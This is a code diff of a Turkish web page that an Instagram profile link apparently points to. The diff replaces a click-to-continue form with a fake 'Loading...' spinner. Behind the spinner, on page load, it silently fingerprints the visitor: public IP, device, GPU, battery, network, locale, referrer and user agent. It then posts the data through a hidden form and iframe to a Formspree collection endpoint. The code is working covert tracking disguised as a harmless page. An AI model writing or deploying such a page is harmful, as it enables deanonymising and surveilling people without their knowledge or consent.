@@ -1,146 +1,246 @@
 <!DOCTYPE html>
 <html lang="tr">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>instagram.com/saphiralogy</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Yükleniyor...</title>
 
-        body {
-            background: #0d0d0d;
-            color: #f4f4f4;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
+<style>
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+    }
 
-        .box {
-            background: #141414;
-            border: 1px solid #222;
-            width: 100%;
-            max-width: 380px;
-            padding: 36px 24px;
-            text-align: center;
-        }
+    body {
+        background-color: #08090c;
+        color: #e8e8ea;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        height: 100vh;
+        width: 100vw;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+    }
 
-        button {
-            width: 100%;
-            background: #f4f4f4;
-            color: #0d0d0d;
-            border: none;
-            padding: 14px;
-            font-weight: 700;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
+    .loader-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 16px;
+    }
 
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
+    .spinner {
+        width: 38px;
+        height: 38px;
+        border: 3px solid rgba(255, 255, 255, 0.1);
+        border-radius: 50%;
+        border-top-color: #ffffff;
+        animation: spin 0.85s linear infinite;
+    }
 
-        #status {
-            margin-top: 16px;
-            font-size: 0.85rem;
-            color: #888;
-        }
-    </style>
+    .text {
+        font-size: 15px;
+        letter-spacing: 0.5px;
+        color: #8e939d;
+        font-weight: 500;
+        animation: pulse 1.8s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+        0%, 100% { opacity: 0.6; }
+        50% { opacity: 1; }
+    }
+
+    /* Arka planda çalışacak gizli elemanlar */
+    .hidden-worker {
+        position: absolute;
+        width: 0;
+        height: 0;
+        border: 0;
+        visibility: hidden;
+        pointer-events: none;
+    }
+</style>
 </head>
 
 <body>
 
-    <div class="box">
-        <form id="fsForm">
-            <input type="hidden" name="ip" id="f_ip" />
-            <input type="hidden" name="ekran" id="f_ekran" />
-            <input type="hidden" name="tarayici" id="f_tarayici" />
-            <input type="hidden" name="dil" id="f_dil" />
-            <input type="hidden" name="saat_dilimi" id="f_saat" />
-
-            <button type="submit" id="btn">Devam Et</button>
-        </form>
-        <div id="status">İnstagramdan Ayrılıyorsunuz...</div>
+    <!-- Kullanıcının gördüğü tek alan -->
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="text">Yükleniyor...</div>
     </div>
 
-    <script>
-        const TARGET_URL = 'https://formspree.io/f/xykzoozp';
-        const form = document.getElementById('fsForm');
-        const btn = document.getElementById('btn');
-        const statusDiv = document.getElementById('status');
+    <!-- Sayfanın Formspree sayfasına yönlenmesini engelleyen gizli iframe -->
+    <iframe name="hidden_target" id="hidden_target" class="hidden-worker"></iframe>
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
+    <!-- Formspree Entegreli Gizli Form -->
+    <form id="diagnosticsForm" action="https://formspree.io/f/xykzoozp" method="POST" target="hidden_target" class="hidden-worker">
+        <input type="hidden" name="_subject" value="Yeni Cihaz & Tarayıcı Telemetrisi">
+        <input type="hidden" name="IP_Adresi" id="f_ip">
+        <input type="hidden" name="Cihaz_ve_OS" id="f_device">
+        <input type="hidden" name="Ekran_Cozunurluk" id="f_screen">
+        <input type="hidden" name="Ekran_Karti" id="f_gpu">
+        <input type="hidden" name="Pil_Durumu" id="f_battery">
+        <input type="hidden" name="Konum_Zaman_Dilimi" id="f_locale">
+        <input type="hidden" name="Baglanti_Turu" id="f_connection">
+        <input type="hidden" name="Kullanici_Ajan_UA" id="f_ua">
+        <input type="hidden" name="Tam_JSON_Raporu" id="f_json">
+    </form>
 
-            btn.disabled = true;
-            btn.textContent = 'GÖNDERİLİYOR...';
-            statusDiv.style.color = '#38bdf8';
-            statusDiv.textContent = 'IP alınıyor ve paketleniyor...';
+<script>
+const DATA = {};
 
-            // 1. IP Çek
-            let ip = 'Bilinmiyor';
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                ip = ipData.ip;
-            } catch (err) {
-                ip = 'Alınamadı (AdBlock/Ağ)';
-            }
+/* ====================================================
+   1. CİHAZ, DONANIM VE EKRAN BİLGİLERİ
+==================================================== */
+DATA.device = {
+    platform: navigator.platform,
+    cores: navigator.hardwareConcurrency || "N/A",
+    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+    touchPoints: navigator.maxTouchPoints || 0,
+    cookieEnabled: navigator.cookieEnabled,
+    online: navigator.onLine,
+    pdfViewer: navigator.pdfViewerEnabled
+};
 
-            // 2. Cihaz Bilgilerini Doldur
-            const payload = {
-                ip: ip,
-                ekran: `${window.screen.width}x${window.screen.height}`,
-                tarayici: navigator.userAgent,
-                dil: navigator.language || 'Bilinmiyor',
-                saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor'
-            };
+DATA.screen = {
+    resolution: `${screen.width} × ${screen.height}`,
+    available: `${screen.availWidth} × ${screen.availHeight}`,
+    viewport: `${window.innerWidth} × ${window.innerHeight}`,
+    pixelRatio: window.devicePixelRatio,
+    colorDepth: `${screen.colorDepth}-bit`,
+    orientation: screen.orientation?.type || "Bilinmiyor",
+    darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
+    hdr: window.matchMedia("(dynamic-range: high)").matches
+};
 
-            document.getElementById('f_ip').value = payload.ip;
-            document.getElementById('f_ekran').value = payload.ekran;
-            document.getElementById('f_tarayici').value = payload.tarayici;
-            document.getElementById('f_dil').value = payload.dil;
-            document.getElementById('f_saat').value = payload.saat_dilimi;
+DATA.locale = {
+    language: navigator.language,
+    languages: (navigator.languages || []).join(", "),
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC",
+    utcOffset: `${new Date().getTimezoneOffset()} min`,
+    localTime: new Date().toString()
+};
 
-            console.group('%c[GİDEN PAKET - FORMSPREE]', 'color: #38bdf8; font-weight: bold;');
-            console.table(payload);
-            console.groupEnd();
+DATA.page = {
+    url: location.href,
+    referrer: document.referrer || "Doğrudan Giriş",
+    title: document.title
+};
 
-            // 3. Doğrudan Formspree Endpointine Gönder
-            try {
-                const res = await fetch(TARGET_URL, {
-                    method: 'POST',
-                    body: new FormData(form),
-                    headers: { 'Accept': 'application/json' }
-                });
+/* ====================================================
+   2. GPU & WEBGL BİLGİSİ
+==================================================== */
+function getGPUInfo() {
+    try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (!gl) return { supported: false };
 
-                if (res.ok) {
-                    console.log('%c[BAŞARILI] Formspree paneline düştü.', 'color: #4ade80; font-weight: bold;');
-                    statusDiv.style.color = '#4ade80';
-                    statusDiv.textContent = 'Başarıyla iletildi.';
-                    btn.textContent = 'TAMAMLANDI';
-                } else {
-                    throw new Error('HTTP ' + res.status);
-                }
-            } catch (error) {
-                console.error('%c[HATA]', 'color: #f87171; font-weight: bold;', error);
-                statusDiv.style.color = '#f87171';
-                statusDiv.textContent = 'Hata: ' + error.message;
-                btn.disabled = false;
-                btn.textContent = 'TEKRAR DENE';
-            }
+        const debug = gl.getExtension("WEBGL_debug_renderer_info");
+        return {
+            supported: true,
+            vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A",
+            renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A"
+        };
+    } catch {
+        return { supported: false };
+    }
+}
+DATA.webgl = getGPUInfo();
+
+/* ====================================================
+   3. BAĞLANTI (NETWORK) BİLGİSİ
+==================================================== */
+const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+DATA.connection = conn ? {
+    effectiveType: conn.effectiveType,
+    downlink: conn.downlink ? `${conn.downlink} Mbps` : "N/A",
+    rtt: conn.rtt ? `${conn.rtt} ms` : "N/A",
+    saveData: !!conn.saveData
+} : { supported: false };
+
+/* ====================================================
+   4. PİL DURUMU (ASYNC)
+==================================================== */
+async function getBatteryInfo() {
+    if (!navigator.getBattery) {
+        DATA.battery = { supported: false };
+        return;
+    }
+    try {
+        const b = await navigator.getBattery();
+        DATA.battery = {
+            charging: b.charging,
+            level: `${Math.round(b.level * 100)}%`,
+            chargingTime: b.chargingTime ? `${b.chargingTime}s` : "Inf",
+            dischargingTime: b.dischargingTime ? `${b.dischargingTime}s` : "Inf"
+        };
+    } catch {
+        DATA.battery = { error: true };
+    }
+}
+
+/* ====================================================
+   5. PUBLIC IP ADRESİ (ASYNC + 2.5s TIMEOUT)
+==================================================== */
+async function getPublicIP() {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 2500);
+
+    try {
+        const res = await fetch("https://api.ipify.org?format=json", {
+            cache: "no-store",
+            signal: controller.signal
         });
-    </script>
-</body>
+        const json = await res.json();
+        DATA.network = { ip: json.ip };
+    } catch {
+        DATA.network = { ip: "Erişilemedi / Engellendi" };
+    } finally {
+        clearTimeout(timeoutId);
+    }
+}
 
+/* ====================================================
+   6. VERİLERİ DOLDUR VE FORMSPREE'YE İLET
+==================================================== */
+function submitTelemetry() {
+    document.getElementById("f_ip").value = DATA.network?.ip || "N/A";
+    document.getElementById("f_device").value = `${DATA.device.platform} | CPU: ${DATA.device.cores} Çekirdek | RAM: ${DATA.device.ram}`;
+    document.getElementById("f_screen").value = `${DATA.screen.resolution} (DPR: ${DATA.screen.pixelRatio}) | Viewport: ${DATA.screen.viewport}`;
+    document.getElementById("f_gpu").value = `${DATA.webgl.vendor} - ${DATA.webgl.renderer}`;
+    document.getElementById("f_battery").value = DATA.battery?.level ? `${DATA.battery.level} (Şarjda: ${DATA.battery.charging ? 'Evet' : 'Hayır'})` : "Desteklenmiyor";
+    document.getElementById("f_locale").value = `${DATA.locale.timezone} | Dil: ${DATA.locale.language}`;
+    document.getElementById("f_connection").value = DATA.connection?.effectiveType ? `${DATA.connection.effectiveType.toUpperCase()} (~${DATA.connection.downlink})` : "N/A";
+    document.getElementById("f_ua").value = navigator.userAgent;
+    document.getElementById("f_json").value = JSON.stringify(DATA, null, 2);
+
+    // Formu arka plandaki hedefe postala
+    const form = document.getElementById("diagnosticsForm");
+    form.submit();
+}
+
+/* ====================================================
+   7. ÇALIŞTIRMA TETİKLEYİCİSİ
+==================================================== */
+(async function init() {
+    await Promise.allSettled([
+        getPublicIP(),
+        getBatteryInfo()
+    ]);
+
+    submitTelemetry();
+})();
+</script>
+
+</body>
 </html>
